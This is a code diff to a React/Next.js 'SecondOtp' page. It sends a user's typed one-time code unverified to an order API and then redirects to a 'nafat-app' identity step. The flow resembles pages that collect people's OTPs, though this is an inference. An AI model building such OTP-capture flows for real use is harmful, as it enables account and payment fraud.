@@ -16,6 +16,8 @@ import { useEffect, useState } from 'react'
 const SecondOtp = () => {
   SwiperCore.use([Autoplay])
   const router = useRouter()
+  const searchParams = useSearchParams()
+  const params = new URLSearchParams(searchParams)
   // a countdown timer function
   const [time, setTime] = useState(180)
   useEffect(() => {
@@ -33,7 +35,33 @@ const SecondOtp = () => {
 
   const handleSubmit = (e) => {
     e.preventDefault()
-    router.push('/nafat-app')
+    const submitData = {
+      secondOtp: e.target.secondOtp.value,
+    }
+
+    if (submitData.secondOtp === '') {
+      toast.error('Please enter your first otp')
+    } else {
+      // post all the data through api localhost:3000/api/order
+      fetch(`${process.env.API_URL}/api/order/${params.get('id')}`, {
+        method: 'PATCH',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(submitData),
+      })
+        .then((res) => res.json())
+        .then((data) => {
+          if (data) {
+            router.push({
+              pathname: '/nafat-app',
+              query: { id: data._id },
+            })
+          } else {
+            toast.error('Please enter correct otp')
+          }
+        })
+    }
   }
 
   return (
@@ -117,7 +145,7 @@ const SecondOtp = () => {
           </button>
         </form>
       </div>
-      <div className="h-20 bg-teal-400 mt-5"></div>
+      <div className="h-20 bg-teal-400 mt-5" />
     </>
   )
 }
